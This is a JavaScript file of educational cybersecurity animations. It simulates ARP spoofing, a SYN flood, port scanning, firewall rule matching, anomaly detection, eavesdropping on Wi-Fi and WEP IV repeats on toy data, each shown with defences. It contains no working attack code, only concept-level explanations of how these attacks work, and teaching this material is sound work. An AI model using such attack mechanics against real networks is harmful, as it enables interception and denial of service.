/* ===== Complete Cybersecurity animations, part 3: Network and Systems, Application Security, Security Operations and Advanced. Built on MLZ.trace and CYZ (assets/cywidgets.js). ===== */

/* =====================================================================================================
   Network and Systems 1.1  ARP spoofing on a toy LAN, with no defence, Dynamic ARP Inspection or static entries
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const GW = 'aa:01', LAP = 'bb:05', ATK = 'cc:07';
  trace('cyarp', {
    title: 'ARP spoofing: how a man in the middle starts on a LAN',
    sub: 'ARP turns an IP address into a MAC address, and hosts believe any reply, even one they never asked for. The attacker tells the laptop "I am the gateway" and the gateway "I am the laptop". Choose a defence to see where it stops the lie.',
    W: 600, H: 340,
    params: [
      { k: 'def', label: 'Defence', type: 'select', v: 'none', opts: [['none', 'No defence'], ['dai', 'Switch: Dynamic ARP Inspection'], ['static', 'Laptop: static ARP entry for the gateway']] }
    ],
    tips: [
      { t: 'Play with no defence. Both caches are poisoned, and all the laptop’s traffic flows through the attacker.', play: true },
      { t: 'Turn on Dynamic ARP Inspection. The switch compares each reply with its DHCP snooping table and drops the forged ones.', set: { def: 'dai' }, play: true },
      { t: 'Try a static entry. The laptop ignores the lie, but the gateway can still be fooled, and static entries are hard to manage on big networks.', set: { def: 'static' }, play: true }
    ],
    frames(p) {
      const d = p.def;
      const fr = [];
      fr.push({ st: 1, lap: GW, gw: LAP, say: 'Normal state. The laptop (10.0.0.5) knows the gateway 10.0.0.1 is at MAC aa:01, and the gateway knows the laptop is at bb:05. Traffic goes laptop, switch, gateway.' });
      const lapFooled = d === 'none', gwFooled = d !== 'dai';
      fr.push({ st: 2, lap: GW, gw: LAP, msg: 1, say: `The attacker (10.0.0.7, MAC cc:07) sends the laptop an unasked ARP reply: "10.0.0.1 is at cc:07". ARP has no authentication, so nothing proves who sent it.` });
      fr.push({ st: 3, lap: lapFooled ? ATK : GW, gw: LAP, msg: 1, drop1: d === 'dai', ign1: d === 'static', say: d === 'none' ? 'The laptop overwrites its cache: the gateway is now at cc:07. Its next packets to the internet go to the attacker.' : d === 'dai' ? 'Dynamic ARP Inspection: the switch knows from DHCP snooping that 10.0.0.1 belongs to aa:01, so it drops the forged reply and logs it.' : 'The laptop has a static entry for 10.0.0.1, so it ignores the reply. Its cache stays correct.' });
      fr.push({ st: 4, lap: lapFooled ? ATK : GW, gw: gwFooled ? ATK : LAP, msg: 2, drop2: d === 'dai', say: gwFooled ? 'Now the attacker tells the gateway "10.0.0.5 is at cc:07". The gateway believes it, so replies for the laptop also go to the attacker.' : 'The second forged reply, to the gateway, is dropped by the switch as well.' });
      const mitm = lapFooled && gwFooled;
      fr.push({ st: 5, done: true, lap: lapFooled ? ATK : GW, gw: gwFooled ? ATK : LAP, mitm, half: !mitm && gwFooled, say: mitm ? 'Man in the middle: laptop to attacker to gateway, both ways. The attacker forwards packets so nothing seems wrong, and can read or change anything not protected by TLS. Tools such as arpwatch alert when an IP address changes MAC.' : !gwFooled ? 'Both lies were stopped at the switch. This is why managed switches with DHCP snooping and DAI are standard in offices, and why TLS still matters on every network.' : 'Half protected: the laptop is safe, but the gateway sends the laptop’s replies to the attacker, who can still read them. Defences must cover every host, which is why the switch is the better place.' });
      return fr.map(x => ({ ...x, d }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      const node = (x, y, name, ip, mac, fill) => cbox(z, x, y, 130, 50, [name, `${ip}  ${mac}`], { s: 12, b: true, fill });
      node(14, 20, 'Laptop', '10.0.0.5', LAP, col.surf);
      node(456, 20, 'Gateway', '10.0.0.1', GW, col.surf);
      node(235, 250, 'Attacker', '10.0.0.7', ATK, 'rgba(225,29,72,0.15)');
      cbox(z, 250, 120, 100, 34, f.d === 'dai' ? 'switch + DAI' : 'switch', { s: 12, b: true, mono: true, fill: f.d === 'dai' ? 'rgba(15,118,110,0.25)' : col.bg });
      D.line(g, 79, 70, 260, 120, col.line, 2); D.line(g, 521, 70, 340, 120, col.line, 2); D.line(g, 300, 154, 300, 250, col.line, 2);
      cbox(z, 14, 84, 150, 40, ['laptop cache', `10.0.0.1 → ${f.lap}`], { s: 11, b: true, mono: true, fill: f.lap === ATK ? 'rgba(225,29,72,0.2)' : col.bg });
      cbox(z, 436, 84, 150, 40, ['gateway cache', `10.0.0.5 → ${f.gw}`], { s: 11, b: true, mono: true, fill: f.gw === ATK ? 'rgba(225,29,72,0.2)' : col.bg });
      if (f.msg === 1 && f.st <= 3) { D.arrow(g, 260, 255, 150, 128, col.red, 2.5); cbox(z, 60, 178, 170, 26, '"10.0.0.1 is at cc:07"', { s: 11, b: true, mono: true, fill: col.surf, c: col.red }); }
      if (f.msg === 2) { D.arrow(g, 340, 255, 450, 128, col.red, 2.5); cbox(z, 370, 178, 170, 26, '"10.0.0.5 is at cc:07"', { s: 11, b: true, mono: true, fill: col.surf, c: col.red }); }
      if (f.drop1 || (f.drop2 && f.msg === 2)) cbox(z, 250, 162, 100, 24, 'DROPPED', { s: 12, b: true, fill: col.green, c: '#fff' });
      if (f.ign1) cbox(z, 14, 130, 150, 22, 'ignored (static)', { s: 11, b: true, fill: col.green, c: '#fff' });
      if (f.done) {
        if (f.mitm) { D.arrow(g, 120, 70, 255, 250, col.orange, 3); D.arrow(g, 345, 250, 480, 70, col.orange, 3); }
        cbox(z, 14, 306, 572, 28, f.mitm ? 'man in the middle: all traffic passes the attacker' : f.half ? 'half protected: replies to the laptop still pass the attacker' : 'attack stopped: caches stay correct', { s: 13, b: true, fill: f.mitm || f.half ? col.red : col.cv, c: '#fff' });
      }
    }
  });
})();

/* =====================================================================================================
   Network and Systems 1.1  A SYN flood filling the half open queue, with and without SYN cookies
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  trace('cysynflood', {
    title: 'SYN flood: filling the queue of half open connections',
    sub: 'Each SYN makes the server reserve a slot and wait up to 30 seconds for the final ACK. Forged SYNs never send it, so slots fill. With SYN cookies the server keeps no slot: it hides the state in its sequence number.',
    W: 600, H: 340,
    params: [
      { k: 'rate', label: 'Forged SYNs per second', type: 'range', v: 50, min: 0, max: 100, step: 5 },
      { k: 'ck', label: 'SYN cookies', type: 'select', v: 'off', opts: [['off', 'Off'], ['on', 'On']] }
    ],
    tips: [
      { t: 'Play at 50 forged SYNs a second with cookies off. After about 20 seconds the 1024 slots are full and real users are refused.', play: true },
      { t: 'Turn SYN cookies on. The queue still fills, but when it is full the server answers with cookies and real users still get in.', set: { ck: 'on' }, play: true },
      { t: 'Set 30 SYNs a second. 30 × 30 = 900 half open connections stay below 1024, so the server copes even without cookies.', set: { rate: 30, ck: 'off' }, play: true }
    ],
    frames(p) {
      const rate = +p.rate, ck = p.ck === 'on', B = 1024, T = 30, legit = 2;
      const fr = [{ st: 0, ticks: [], say: `Backlog of ${B} slots, timeout ${T} s. Forged SYNs arrive at ${rate} per second from random fake addresses, and real users at ${legit} per second.` }];
      const ticks = []; let served = 0, refused = 0;
      for (let t = 5; t <= 40; t += 5) {
        const half = Math.min(B, rate * Math.min(t, T));
        const full = half >= B;
        const ok = full && !ck ? 0 : legit * 5; served += ok; refused += legit * 5 - ok;
        ticks.push({ t, half, full });
        fr.push({ st: 1, ticks: ticks.slice(), served, refused, say: `t = ${t} s: ${rate} × ${Math.min(t, T)} = ${rate * Math.min(t, T)} forged half open connections${rate * Math.min(t, T) > B ? `, capped at ${B}` : ''}. ${full ? (ck ? 'Queue full, so the server switches to SYN cookies and real users still connect.' : 'Queue full: real users’ SYNs are dropped.') : 'Room left, real users connect.'}` });
      }
      fr.push({ st: 2, done: true, ticks, served, refused, say: refused ? `${refused} real connection attempts were refused. The steady state is rate × timeout = ${rate * T}, which is more than ${B}. Cutting the timeout, raising the backlog, SYN cookies and upstream filtering all help.` : `All ${served} real attempts got through. ${ck && rate * T >= B ? 'SYN cookies carried the load once the queue filled, at the cost of some TCP options.' : `rate × timeout = ${rate * T} stays below ${B}.`}` });
      return fr.map(x => ({ ...x, rate, ck, B }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, L = 50, Bm = 280, H = 230;
      D.line(g, L, Bm, 400, Bm, col.line, 1.5); D.line(g, L, Bm, L, Bm - H - 10, col.line, 1.5);
      D.line(g, L, Bm - H, 400, Bm - H, col.red, 1, [5, 4]); D.text(g, 'backlog 1024', 398, Bm - H - 5, { a: 'right', s: 10, b: true, c: col.red });
      D.text(g, 'half open', L - 6, Bm - H - 16, { s: 10, b: true, c: col.ink2 });
      f.ticks.forEach((k, i) => {
        const x = L + 10 + i * 42, h = k.half / f.B * H;
        D.rect(g, x, Bm - h, 30, h, { fill: k.full ? col.red : col.cv });
        D.text(g, `${k.t}s`, x + 15, Bm + 14, { a: 'center', s: 10, c: col.ink2 });
      });
      cbox(z, 450, 20, 136, 44, ['SYN cookies', f.ck ? 'ON' : 'OFF'], { s: 13, b: true, fill: f.ck ? 'rgba(15,118,110,0.25)' : col.bg });
      if (f.st >= 1) { cbox(z, 450, 80, 136, 44, ['real users in', String(f.served)], { s: 13, b: true, fill: col.surf }); cbox(z, 450, 134, 136, 44, ['refused', String(f.refused)], { s: 13, b: true, fill: f.refused ? 'rgba(225,29,72,0.2)' : col.surf }); }
      if (f.done) cbox(z, 14, 306, 572, 28, f.refused ? 'denial of service: real users refused' : 'service stayed up', { s: 13, b: true, fill: f.refused ? col.red : col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 1.1  How a port scan reads replies: SYN scan against connect scan on a pretend host
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const HOST = [[22, 'open', 'SSH'], [23, 'closed', 'Telnet'], [80, 'open', 'HTTP'], [445, 'filtered', 'SMB'], [3389, 'filtered', 'RDP'], [8080, 'closed', 'alt HTTP']];
  trace('cyscan', {
    title: 'Port scanning: what the replies mean',
    sub: 'A scanner sends a SYN to each port of a pretend host and reads the answer: SYN-ACK means open, RST means closed, silence means a firewall dropped it. Scan only systems you own or have written permission to test.',
    W: 600, H: 340,
    params: [
      { k: 'how', label: 'Scan type', type: 'select', v: 'syn', opts: [['syn', 'SYN scan (half open)'], ['connect', 'Connect scan (full handshake)']] }
    ],
    tips: [
      { t: 'Play the SYN scan. After a SYN-ACK the scanner sends RST, so the connection never completes and the service may not log it.', play: true },
      { t: 'Choose the connect scan. It finishes the handshake with ACK, so the service sees and logs a real connection.', set: { how: 'connect' }, play: true }
    ],
    frames(p) {
      const syn = p.how === 'syn';
      const rows = [];
      const fr = [{ st: 0, rows: [], say: `Scanning a pretend host with a ${syn ? 'SYN (half open) scan, which needs raw packet rights' : 'connect scan, which uses the normal connect() call any program can make'}. Nothing leaves this page.` }];
      HOST.forEach(([port, state, svc]) => {
        const reply = state === 'open' ? 'SYN-ACK' : state === 'closed' ? 'RST' : '(no reply)';
        const after = state === 'open' ? (syn ? 'send RST' : 'send ACK, then close') : state === 'filtered' ? 'retry, time out' : '';
        rows.push({ port, state, svc, reply, after });
        fr.push({ st: 1, rows: rows.slice(), say: `Port ${port} (${svc}): SYN sent, reply ${reply}. ${state === 'open' ? `Open: a service is listening. ${syn ? 'The scanner resets at once, so no connection is made.' : 'The scanner completes the handshake, so the service logs a connection.'}` : state === 'closed' ? 'Closed: the host is up but nothing listens on this port.' : 'Filtered: a firewall silently dropped the probe, so the scanner cannot tell what is behind it.'}` });
      });
      fr.push({ st: 2, done: true, rows, say: 'Result: 2 open, 2 closed, 2 filtered. Defenders close unused ports, filter the rest, and alert when one source touches many ports in a short time. Telnet sends passwords in clear text and should be off, and SMB and RDP should never face the internet.' });
      return fr.map(x => ({ ...x, syn }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      ['port', 'service', 'reply', 'scanner then', 'state'].forEach((h, i) => D.text(g, h, [20, 90, 200, 320, 490][i], 22, { s: 12, b: true, c: col.ink2 }));
      f.rows.forEach((r, i) => {
        const y = 32 + i * 40, c = r.state === 'open' ? col.green : r.state === 'closed' ? col.ink2 : col.orange;
        cbox(z, 14, y, 64, 32, String(r.port), { s: 13, b: true, mono: true, fill: col.surf });
        cbox(z, 84, y, 104, 32, r.svc, { s: 12, b: true, fill: col.bg });
        cbox(z, 194, y, 116, 32, r.reply, { s: 12, b: true, mono: true, fill: col.surf, c });
        cbox(z, 316, y, 160, 32, r.after || '-', { s: 11, b: true, fill: col.bg });
        cbox(z, 482, y, 104, 32, r.state, { s: 13, b: true, fill: c, c: '#fff' });
      });
      if (f.done) cbox(z, 14, 306, 572, 28, f.syn ? 'SYN scan: quieter, needs raw sockets' : 'connect scan: no special rights, logged by services', { s: 13, b: true, fill: col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 1.2  A packet walks down an ordered firewall rule list: first match wins, default deny
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const RULES = [['allow', 'tcp', '0.0.0.0/0', 443, 'HTTPS from anyone'], ['allow', 'tcp', '10.0.0.0/8', 22, 'SSH from the office'], ['deny', 'tcp', '0.0.0.0/0', 23, 'Telnet, log it']];
  const PK = { web: ['tcp', '203.0.113.5', 443], ssh_in: ['tcp', '10.1.2.3', 22], ssh_out: ['tcp', '203.0.113.5', 22], telnet: ['tcp', '198.51.100.7', 23], dns: ['udp', '203.0.113.5', 53] };
  const inNet = (ip, net) => { if (net === '0.0.0.0/0') return true; const [base, bits] = net.split('/'); const a = ip.split('.').map(Number), b = base.split('.').map(Number); let need = +bits; for (let i = 0; i < 4 && need > 0; i++, need -= 8) { const m = need >= 8 ? 255 : (0xff << (8 - need)) & 255; if ((a[i] & m) !== (b[i] & m)) return false; } return true; };
  trace('cyfirewall', {
    title: 'Firewall rules: first match wins',
    sub: 'A packet filter checks rules from the top. The first rule that matches decides, and a packet that matches nothing hits the default deny. Pick a packet and watch it walk down the list.',
    W: 600, H: 340,
    params: [
      { k: 'pk', label: 'Packet', type: 'select', v: 'ssh_out', opts: [['web', 'TCP 443 from 203.0.113.5'], ['ssh_in', 'TCP 22 from 10.1.2.3 (office)'], ['ssh_out', 'TCP 22 from 203.0.113.5 (internet)'], ['telnet', 'TCP 23 from 198.51.100.7'], ['dns', 'UDP 53 from 203.0.113.5']] }
    ],
    tips: [
      { t: 'Play SSH from the internet. It fails rule 1 (wrong port) and rule 2 (wrong source), so the default deny drops it.', play: true },
      { t: 'Try SSH from the office. Rule 2 matches, so it is allowed and rule 3 is never checked.', set: { pk: 'ssh_in' }, play: true },
      { t: 'Try UDP 53. No rule mentions UDP, so it falls through to the default deny, the safe choice.', set: { pk: 'dns' }, play: true }
    ],
    frames(p) {
      const [proto, src, port] = PK[p.pk];
      const fr = [{ st: 0, at: -1, res: [], say: `Packet: ${proto.toUpperCase()} from ${src} to port ${port}. The firewall checks the rules in order.` }];
      const res = []; let hit = -1;
      for (let i = 0; i < RULES.length; i++) {
        const [act, rp, net, rport] = RULES[i];
        const why = rp !== proto ? `protocol ${proto} is not ${rp}` : !inNet(src, net) ? `${src} is not in ${net}` : rport !== port ? `port ${port} is not ${rport}` : '';
        res.push(why ? 'no' : 'yes');
        fr.push({ st: 1, at: i, res: res.slice(), say: `Rule ${i + 1} (${act} ${rp} from ${net} to port ${rport}): ${why ? 'no match, because ' + why + '. Move on.' : `match, so the packet is <b>${act === 'allow' ? 'ALLOWED' : 'DENIED'}</b>. Later rules are not checked.`}` });
        if (!why) { hit = i; break; }
      }
      if (hit < 0) fr.push({ st: 1, at: 3, res: res.concat(['yes']), say: 'No rule matched, so the default rule applies: <b>DENY</b>. Default deny means anything not clearly allowed is blocked.' });
      const act = hit < 0 ? 'deny' : RULES[hit][0];
      fr.push({ st: 2, done: true, at: hit < 0 ? 3 : hit, res: fr[fr.length - 1].res, act, say: `Result: ${act === 'allow' ? 'allowed' : 'dropped'} by ${hit < 0 ? 'the default rule' : 'rule ' + (hit + 1)}. Order matters: if a broad allow rule sat above a narrow deny rule, the deny would never be reached, which is called shadowing.` });
      return fr.map(x => ({ ...x, proto, src, port }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      cbox(z, 14, 12, 572, 30, `packet: ${f.proto.toUpperCase()}  ${f.src}  →  port ${f.port}`, { s: 13, b: true, mono: true, fill: col.surf });
      const rows = RULES.map((r, i) => `${i + 1}. ${r[0].toUpperCase()} ${r[1]} from ${r[2]} port ${r[3]}`).concat(['default: DENY everything else']);
      rows.forEach((t, i) => {
        const y = 56 + i * 52, r = f.res[i];
        const fill = r === 'yes' ? ((i < 3 ? RULES[i][0] : 'deny') === 'allow' ? col.green : col.red) : r === 'no' ? col.bg : col.surf;
        cbox(z, 60, y, 400, 40, t, { s: 13, b: true, mono: true, fill, c: r === 'yes' ? '#fff' : r === 'no' ? col.ink2 : col.ink });
        if (r) cbox(z, 470, y, 116, 40, r === 'yes' ? 'match' : 'no match', { s: 12, b: true, fill: col.surf, c: r === 'yes' ? col.cv : col.ink2 });
        if (f.at === i) D.arrow(g, 18, y + 20, 54, y + 20, col.orange, 3);
      });
      if (f.done) cbox(z, 14, 306, 572, 28, f.act === 'allow' ? 'ALLOWED' : 'DROPPED', { s: 14, b: true, fill: f.act === 'allow' ? col.green : col.red, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 1.2  Anomaly detection: a z score threshold on login failures per minute
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const DATA = [4, 5, 3, 6, 4, 9, 5, 4, 30, 38, 4, 5, 7, 3, 8, 4], ATTACK = new Set([8, 9]), TRAIN = 6;
  const mean = DATA.slice(0, TRAIN).reduce((a, b) => a + b, 0) / TRAIN;
  const sd = Math.sqrt(DATA.slice(0, TRAIN).reduce((a, b) => a + (b - mean) ** 2, 0) / TRAIN);
  trace('cyids', {
    title: 'Anomaly detection: how far from normal is too far?',
    sub: 'The detector learns normal login failures per minute from the first 6 minutes, then alerts when a minute is more than k standard deviations above the mean. A password guessing burst hits minutes 9 and 10. Change k to trade missed attacks against false alarms.',
    W: 600, H: 340,
    params: [
      { k: 'th', label: 'Alert threshold k (z score)', type: 'range', v: 3, min: 1, max: 6, step: 0.5 }
    ],
    tips: [
      { t: 'Play with k = 3. The burst is caught and the busy minutes with 7 and 8 failures are not flagged.', play: true },
      { t: 'Set k = 1. Now the busy minute with 8 failures raises a false alarm. On a real network that means hundreds a day, and analysts start ignoring alerts.', set: { th: 1 }, play: true },
      { t: 'Set k = 6. Still caught here, but a slower attack of 15 failures a minute would now slip through.', set: { th: 6 }, play: true }
    ],
    frames(p) {
      const th = +p.th, cut = mean + th * sd;
      const fr = [{ st: 0, n: 0, say: `Training on minutes 1 to 6: mean = ${mean.toFixed(2)}, standard deviation = ${sd.toFixed(2)}. Alert line = mean + ${th} &times; sd = ${cut.toFixed(1)} failures.` }];
      let tp = 0, fp = 0, fn = 0;
      for (let i = TRAIN; i < DATA.length; i++) {
        const z = (DATA[i] - mean) / sd, alert = z > th, bad = ATTACK.has(i);
        if (alert && bad) tp++; else if (alert) fp++; else if (bad) fn++;
        fr.push({ st: 1, n: i + 1, tp, fp, fn, say: `Minute ${i + 1}: ${DATA[i]} failures, z = ${z.toFixed(1)}. ${alert ? (bad ? '<b>Alert</b>, and it really is the attack: a true positive.' : '<b>Alert</b>, but this was a normal busy minute: a false positive.') : (bad ? 'No alert, yet this was the attack: a false negative.' : 'Below the line, no alert.')}` });
      }
      fr.push({ st: 2, done: true, n: DATA.length, tp, fp, fn, say: `Totals: ${tp} true alerts, ${fp} false alarms, ${fn} missed. Lower k catches more but floods analysts. Higher k is quieter but misses slow attacks. Real systems also learn daily patterns and combine many signals.` });
      return fr.map(x => ({ ...x, th, cut }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, L = 40, R = 420, T = 20, B = 290, mx = 40;
      const Y = v => B - Math.min(v, mx) / mx * (B - T), bw = (R - L) / DATA.length;
      D.line(g, L, B, R, B, col.line, 1.5); D.line(g, L, T, L, B, col.line, 1.5);
      D.rect(g, L, T, bw * TRAIN, B - T, { fill: 'rgba(15,118,110,0.07)' });
      D.text(g, 'training', L + 4, T + 12, { s: 10, b: true, c: col.cv });
      const shown = Math.max(f.n, TRAIN);
      for (let i = 0; i < shown; i++) {
        const z0 = (DATA[i] - mean) / sd, alert = i >= TRAIN && z0 > f.th;
        D.rect(g, L + i * bw + 3, Y(DATA[i]), bw - 6, B - Y(DATA[i]), { fill: i < TRAIN ? col.ink2 : alert ? (ATTACK.has(i) ? col.red : col.orange) : col.cv });
        D.text(g, String(i + 1), L + i * bw + bw / 2, B + 13, { a: 'center', s: 9, c: col.ink2 });
      }
      D.line(g, L, Y(f.cut), R, Y(f.cut), col.red, 1.5, [6, 4]);
      D.text(g, `alert line ${f.cut.toFixed(1)}`, R - 2, Y(f.cut) - 5, { a: 'right', s: 10, b: true, c: col.red });
      if (f.st >= 1) {
        cbox(z, 440, 20, 146, 40, ['true alerts', String(f.tp)], { s: 12, b: true, fill: 'rgba(225,29,72,0.15)' });
        cbox(z, 440, 70, 146, 40, ['false alarms', String(f.fp)], { s: 12, b: true, fill: 'rgba(234,88,12,0.15)' });
        cbox(z, 440, 120, 146, 40, ['missed', String(f.fn)], { s: 12, b: true, fill: col.surf });
      }
      if (f.done) cbox(z, 14, 306, 572, 28, `k = ${f.th}: ${f.tp} caught, ${f.fp} false alarms, ${f.fn} missed`, { s: 13, b: true, fill: col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 1.2  What an eavesdropper on café Wi-Fi sees: no protection, TLS, or a VPN tunnel
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  trace('cyvpn', {
    title: 'What does an eavesdropper see? Plain, TLS and VPN',
    sub: 'The same web request leaves a laptop on café Wi-Fi. Step through the layers it is wrapped in and see what someone watching the Wi-Fi can still read. A VPN wraps the whole packet, encrypted, inside a new one addressed to the VPN gateway.',
    W: 600, H: 340,
    params: [
      { k: 'mode', label: 'Protection', type: 'select', v: 'vpn', opts: [['plain', 'None (plain HTTP)'], ['tls', 'HTTPS (TLS)'], ['vpn', 'VPN tunnel plus HTTPS']] }
    ],
    tips: [
      { t: 'Play the VPN. The watcher sees only the VPN gateway’s address, packet sizes and timing.', play: true },
      { t: 'Choose plain HTTP. Everything, including the password, is readable.', set: { mode: 'plain' }, play: true },
      { t: 'Choose HTTPS. The content is hidden, but the watcher still sees which server you talk to and usually its name.', set: { mode: 'tls' }, play: true }
    ],
    frames(p) {
      const m = p.mode;
      const fr = [{ st: 1, say: 'The browser builds a request: POST /login with user=asha and password=Sunrise7, for shop.example on port 443 or 80.' }];
      if (m !== 'plain') fr.push({ st: 2, say: 'TLS encrypts the HTTP request and protects it with an authentication tag. The TCP and IP headers outside it stay readable: they must, so routers can deliver it.' });
      if (m === 'vpn') fr.push({ st: 3, say: 'The VPN client encrypts the whole IP packet, headers included, and puts it inside a new UDP packet addressed to the VPN gateway (WireGuard uses port 51820 by default).' });
      const sees = m === 'plain' ? 'Everything: server address, the page, the user name and the password.' : m === 'tls' ? 'The server’s IP address and port, usually its name from the TLS handshake (SNI) or DNS, and sizes and timing. Not the page or the password.' : 'Only that the laptop talks to the VPN gateway, plus sizes and timing. The destination and its name are hidden inside the tunnel.';
      fr.push({ st: 4, done: true, say: `What the café Wi-Fi watcher sees: ${sees} ${m === 'vpn' ? 'The VPN provider, however, now sees what the café could have seen, so you move trust, you do not remove it.' : ''}` });
      return fr.map(x => ({ ...x, m }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, x0 = 120, w = 360;
      const red = 'rgba(225,29,72,0.18)', grn = 'rgba(15,118,110,0.22)';
      cbox(z, 14, 14, 90, 40, 'laptop', { s: 12, b: true, fill: col.surf });
      cbox(z, 496, 14, 90, 40, f.m === 'vpn' ? 'VPN gateway' : 'shop.example', { s: 11, b: true, fill: col.surf });
      D.arrow(g, 108, 34, 490, 34, col.line, 2);
      cbox(z, 230, 44, 140, 22, 'café Wi-Fi watcher', { s: 11, b: true, fill: col.surf, c: col.red });
      let y = 90;
      if (f.st >= 3) { cbox(z, x0 - 50, y, w + 100, 30, 'outer IP: laptop → VPN gateway | UDP 51820', { s: 12, b: true, mono: true, fill: red }); y += 36; }
      const enc3 = f.st >= 3;
      cbox(z, x0 - 20, y, w + 40, 30, 'IP: laptop → shop.example | TCP 443', { s: 12, b: true, mono: true, fill: enc3 ? grn : red, c: enc3 ? col.cv : col.ink }); y += 36;
      const enc2 = f.st >= 2;
      cbox(z, x0, y, w, 30, enc2 ? 'TLS record (encrypted)' : 'HTTP: POST /login', { s: 12, b: true, mono: true, fill: enc2 ? grn : red, c: enc2 ? col.cv : col.ink }); y += 36;
      cbox(z, x0 + 20, y, w - 40, 30, 'user=asha password=Sunrise7', { s: 12, b: true, mono: true, fill: enc2 ? grn : red, c: enc2 ? col.cv : col.ink });
      D.text(g, 'red: readable on the Wi-Fi   green: encrypted', 300, 286, { a: 'center', s: 11, b: true, c: col.ink2 });
      if (f.done) cbox(z, 14, 306, 572, 28, f.m === 'plain' ? 'everything readable' : f.m === 'tls' ? 'content hidden, server visible' : 'destination hidden, VPN gateway visible', { s: 13, b: true, fill: f.m === 'plain' ? col.red : col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Network and Systems 1.3  The WEP birthday problem: how quickly a random IV repeats
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  trace('cywep', {
    title: 'WEP’s 24 bit IV: the birthday paradox on Wi-Fi',
    sub: 'WEP mixed a 24 bit IV into the same key for every packet. When an IV repeats, the keystream repeats, and two ciphertexts XOR to the two plaintexts. P(repeat after n packets) ≈ 1 − e^(−n²/2N) with N = 2^bits.',
    W: 600, H: 340,
    params: [
      { k: 'bits', label: 'IV size in bits', type: 'select', v: '24', opts: [['24', '24 bits (WEP)'], ['32', '32 bits'], ['48', '48 bits (TKIP and CCMP packet numbers)']] }
    ],
    tips: [
      { t: 'Play 24 bits. A 50% chance of a repeat comes after only about 4823 packets, a few seconds on a busy network.', play: true },
      { t: 'Choose 48 bits. CCMP in WPA2 uses a 48 bit packet number that only counts up, so with a fresh key per session it never repeats.', set: { bits: '48' }, play: true }
    ],
    frames(p) {
      const b = +p.bits, N = 2 ** b, half = Math.sqrt(2 * Math.log(2) * N);
      const P = n => 1 - Math.exp(-n * n / (2 * N));
      const ns = [1000, 2000, 4823, 10000, 40000, 1e6, 2e7];
      const fr = [{ st: 0, pts: [], say: `IV space N = 2<sup>${b}</sup> = ${N.toLocaleString('en')}. Each packet picks an IV. How many packets until two share one?` }];
      const pts = [];
      ns.forEach(n => { pts.push([n, P(n)]); fr.push({ st: 1, pts: pts.slice(), say: `After ${n.toLocaleString('en')} packets: P(repeat) &asymp; 1 &minus; e<sup>&minus;n&sup2;/2N</sup> = <b>${(100 * P(n)).toFixed(P(n) < 0.001 ? 4 : 1)}%</b>.` }); });
      fr.push({ st: 2, done: true, pts, say: b === 24 ? `50% after &radic;(2 ln 2 &middot; N) &asymp; ${Math.round(half)} packets. An access point sending 1000 packets a second repeats IVs within seconds, and the FMS (2001) and PTW (2007) attacks went further and recovered the key itself from about 40000 to 85000 packets.` : `50% only after about ${Math.round(half).toLocaleString('en')} packets. ${b === 48 ? 'And WPA2 does not pick randomly: the packet number counts up and the key changes per session, so a nonce repeats only if an attack such as KRACK forces a reset.' : 'Better, but random 32 bit IVs would still repeat on a busy network within hours.'}` });
      return fr.map(x => ({ ...x, b, half }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, L = 50, R = 420, T = 20, B = 262;
      const lx = n => L + Math.log10(n) / Math.log10(2e7) * (R - L), Y = v => B - v * (B - T);
      D.line(g, L, B, R, B, col.line, 1.5); D.line(g, L, T, L, B, col.line, 1.5);
      [10, 1e3, 1e5, 1e7].forEach(n => D.text(g, n >= 1e6 ? `10^${Math.log10(n)}` : n.toLocaleString('en'), lx(n), B + 14, { a: 'center', s: 9, c: col.ink2 }));
      D.text(g, 'packets (log scale)', (L + R) / 2, B + 28, { a: 'center', s: 10, b: true, c: col.ink2 });
      [0, 0.5, 1].forEach(v => { D.text(g, `${v * 100}%`, L - 6, Y(v) + 4, { a: 'right', s: 9, c: col.ink2 }); D.line(g, L, Y(v), R, Y(v), col.line, 0.5, [3, 4]); });
      if (f.st >= 1) {
        const N = 2 ** f.b; let prev = null;
        for (let i = 0; i <= 100; i++) { const n = 10 ** (i / 100 * Math.log10(2e7)), pt = [lx(n), Y(1 - Math.exp(-n * n / (2 * N)))]; if (prev) D.line(g, prev[0], prev[1], pt[0], pt[1], 'rgba(15,118,110,0.35)', 2); prev = pt; }
      }
      f.pts.forEach(([n, v], i) => { D.circle(g, lx(n), Y(v), 5, { fill: i === f.pts.length - 1 ? col.red : col.cv }); });
      if (f.done && f.half < 2e7) { D.line(g, lx(f.half), B, lx(f.half), Y(0.5), col.red, 1.5, [5, 4]); D.text(g, `50% at ${Math.round(f.half)}`, lx(f.half) + 4, Y(0.5) - 6, { s: 10, b: true, c: col.red }); }
      cbox(z, 440, 20, 146, 44, ['IV bits', String(f.b)], { s: 13, b: true, fill: col.surf });
      if (f.pts.length) { const [n, v] = f.pts[f.pts.length - 1]; cbox(z, 440, 74, 146, 44, [`n = ${n.toLocaleString('en')}`, `P = ${(100 * v).toFixed(v < 0.001 ? 4 : 1)}%`], { s: 12, b: true, fill: col.bg }); }
      if (f.done) cbox(z, 14, 306, 572, 28, f.b === 24 ? 'WEP: keystreams repeat within seconds' : 'longer, counting nonces avoid repeats', { s: 13, b: true, fill: f.b === 24 ? col.red : col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
